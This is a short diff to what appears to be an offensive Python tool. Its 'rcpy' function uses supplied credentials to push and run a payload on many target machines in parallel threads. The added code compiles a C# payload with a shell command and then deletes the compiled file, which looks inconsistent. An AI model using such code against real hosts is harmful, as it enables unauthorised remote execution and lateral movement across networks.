@@ -591,6 +591,11 @@ def rcpy(targetList, payload, creds):
     uname = creds.split(":")[0]
     password = creds.split(":")[1]
     index = 0
+    if payload.endswith(".cs"):
+        payload_cmd = cs_path + " -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
+        print(payload_cmd)
+        os.system(payload_cmd)
+        os.remove("payloads/pl.exe")
     for i in targetList:
         completeFlags.append(0)
         x = threading.Thread(target=rcpyT, args=(i, uname, password, payload, index))
@@ -602,7 +607,6 @@ def rcpy(targetList, payload, creds):
     print("\n[+] Done")
 
 
-# DEAD METHOD - TO BE FIXED
 def rcpyT(tgt=0, uname="", pword="", payload="", index=0):  # The actual function for executing a command so that it can be threaded
     global completeFlags
     ending = tgt
